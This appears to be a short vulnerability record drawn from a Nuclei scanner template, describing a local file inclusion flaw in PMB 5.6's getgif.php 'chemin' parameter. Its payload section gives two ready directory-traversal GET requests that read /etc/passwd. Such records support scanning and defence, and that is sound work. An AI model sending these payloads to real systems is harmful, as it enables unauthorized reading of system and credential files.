# Vulnerability: PMB 5.6 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`pmb-directory-traversal.yaml`)

## Description
PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
GET {{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik
```

